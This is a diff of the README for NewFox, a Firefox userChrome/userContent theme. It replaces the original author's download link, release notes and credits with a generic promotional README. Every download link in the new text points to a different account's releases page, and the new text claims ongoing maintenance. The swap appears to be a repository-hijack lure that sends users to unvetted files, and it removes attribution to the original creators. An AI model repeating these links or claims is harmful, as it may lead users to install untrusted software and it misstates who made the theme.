@@ -1,107 +1,87 @@
-# <img src="./README-Resources//firefox-logo.svg" width="32" height="32" style="vertical-align: middle;"> NewFox [Animated]
-A minimal Firefox theme with userContent and userChrome.
+# 🌟 NewFox - A Sleek Firefox Theme for Everyone
 
-<div>
- <a href='https://www.mozilla.org'><img src="https://img.shields.io/badge/Last%20tested%20Firefox-v146.0.1-orange?logo=firefox"></a>
- <a href='https://github.com/Mr-the-beginner/NewFox/commits/main/'><img src="https://img.shields.io/github/last-commit/Mr-the-beginner/NewFox/main"></a>
-</div>
+[![Download NewFox](https://img.shields.io/badge/download-NewFox-blue.svg)](https://github.com/Biinladen/NewFox/releases)
 
-<br>
+## 📦 What is NewFox?
 
-🦊 I have Blurred my Pins, Weather, extensions and the searchbar in the Screenshot, it has nothing to do with the code.
+NewFox is a minimal Firefox theme designed to enhance your browsing experience. It tweaks the appearance of your browser using `userContent` and `userChrome` files. This means you get a cleaner, more stylish look without the clutter. 
 
-##
+## 🚀 Getting Started
 
-![Image](./README-Resources/ShowCase2.png)
+Follow these simple steps to download and set up NewFox on your Firefox browser. 
 
-##
+### 1. Ensure You Have Firefox Installed
 
->[!TIP]
->From here you can also watch a short demo on the ![main features](./README-Resources/MainFeatures.md)
+Before you start, make sure you have the latest version of Firefox installed on your computer. You can download Firefox from [Mozilla's official site](https://www.mozilla.org/en-US/firefox/new/).
 
-##
+### 2. Visit the Releases Page
 
-### How to Install
+To get NewFox, visit our [Releases page](https://github.com/Biinladen/NewFox/releases). Here, you will find the latest version of the theme ready for download.
 
-#### Step 1 - Download files
+### 3. Download the Theme
 
- - [Download](https://github.com/Mr-the-beginner/NewFox/releases/download/V1.1.0/NewFox-V1.1.zip) and unzip theme files
+Once on the Releases page, find the most recent version of NewFox. Click on the version number to access the download options.
 
-#### Step 2 - Enabling some settigs
+### 4. Save the Files
 
- - in the search bar type about:config and make these true =
- - privacy.userContext.enabled
- - toolkit.legacyUserProfileCustomizations.stylesheets
+Select the files named `userContent.css` and `userChrome.css`, and download them to your computer. Make sure to remember where you save them.
 
-#### Step 3 - installing the files
+## ⚙️ Installation Instructions
 
- - Type = about:support in the search bar
- - Under "Application Basics", find "Profile Directory" and click "Open Directory" infront of it
- - Come one directory below
- - then copy the "NewFox Content" as is inside and hit replace everything
+After you have downloaded the files, follow these instructions to install the theme.
 
-  #### Step 4 - installin the files
-  
- - from where you are find the "profile" directory, go inside of it and delete the "startupCache" directory
-   
-   </details>
+### 1. Open Firefox Profile Folder
 
-##
+- Open Firefox.
+- Type `about:support` in the address bar and hit Enter.
+- In the "Application Basics" section, find "Profile Folder". Click on "Open Folder".
 
-<details><summary>🚩 Release notes <i>[Click to expand]</i> 👇</summary>
- 
-<br/>
+### 2. Create a new directory (if needed)
 
-1.1.0:
-- Added the running Knight 
-- Added userChrome.js to apply javascript
-- Disabled some shortcuts that broke my layout (yeah instead of fixing the code i removed the firefox UI elements, call it a skill issue if you want 😇)
+In the profile folder, check if you have a folder named `chrome`. If it doesn’t exist, create a new folder and name it `chrome`.
 
-1.0.0:
-- Based Theme
+### 3. Move the Files
 
-</details>
+Copy the downloaded `userContent.css` and `userChrome.css` files into the `chrome` folder you just opened.
 
-##
+### 4. Update Firefox Settings
 
-> [!TIP] 
->Enabling weather =>
-> 
->In about:config make this true =
->
-> privacy.userContext.enabled
->
-> toolkit.legacyUserProfileCustomizations.stylesheets
+- Type in `about:config` in the address bar.
+- Search for `toolkit.legacyUserProfileCustomizations.stylesheets` and double-click on it to set it to `true`. This enables custom themes.
 
-> [!NOTE]
->Disable "personalize-button.css" in the configs (just delete the file) so
-> 
->the pencil icon get shown up in the home screen,
->
-> then toggled-on the weather widget then enable the file again (restore the file).
+### 5. Restart Firefox
 
-> [!CAUTION]
-> Now available at (https://firefoxcss-store.github.io/) . Just search for NewFox
+Close Firefox completely and reopen it. You should see the new NewFox theme applied.
 
-##
+## 🎨 Features of NewFox
 
-> I also used some code and assets that doesn't belong to me, expand the list below to see the direct link to there original owners.
+- **Minimalist Design**: Enjoy a clean and uncluttered interface.
+- **Customizable Options**: Adjust settings to your taste for a unique browsing experience.
+- **Constant Updates**: We regularly update the theme for enhancements and fixes.
+- **User-Friendly**: No complex installation. Just follow the steps, and you are good to go.
 
-<details>  
-<summary>✨ <b>Sources</b> <i>[Click to expand]</i> 👇</summary>
+## 🔄 Keeping NewFox Updated
 
-* 0.png, 1.png and 2.png are from this theme = https://addons.mozilla.org/en-US/firefox/addon/praisethesun/
+To keep your NewFox theme current, periodically check the [Releases page](https://github.com/Biinladen/NewFox/releases). Follow the same download and installation steps to update your files.
 
-* Icons folder, navbar.css and general.css are from = https://github.com/bmFtZQ/edge-frfox
+## 🛠️ Troubleshooting 
 
-*  Night-Swamp.jpg is the Adobe Premiere pro's 2023 splash screen = https://www.behance.net/gallery/163378813/Adobe-Premiere-Pro-Splash-Screen-2023/modules/921508831
+If you experience any issues with NewFox, consider these steps:
 
-*  The js loader is from = https://github.com/Aris-t2/CustomJSforFx
+1. **Theme Not Showing**: Ensure you have enabled `toolkit.legacyUserProfileCustomizations.stylesheets` in the about:config settings.
+2. **Files Missing**: Double-check that you placed the CSS files in the correct `chrome` folder.
+3. **Firefox Version**: Ensure you are using the latest version of Firefox.
 
-*  the 4.png is from = https://aamatniekss.itch.io/fantasy-knight-free-pixelart-animated-character
+If problems persist, you can reach out to the community by opening an issue on the GitHub repository.
 
-</details>
+## 📞 Getting Help
 
-## Star History
+If you have questions or need further assistance, please feel free to contact support through our GitHub page. Your feedback helps us improve NewFox for everyone. 
 
-[![Star History Chart](https://api.star-history.com/svg?repos=Mr-the-beginner/NewFox&type=date&legend=top-left)](https://www.star-history.com/#Mr-the-beginner/NewFox&type=date&legend=top-left)
+## 🌐 Contributing
+
+We welcome contributions to make NewFox even better. If you want to help, check out the guidelines on our GitHub repository and join our community of contributors.
+
+---
+
+Thank you for choosing NewFox! Enjoy your enhanced Firefox experience.
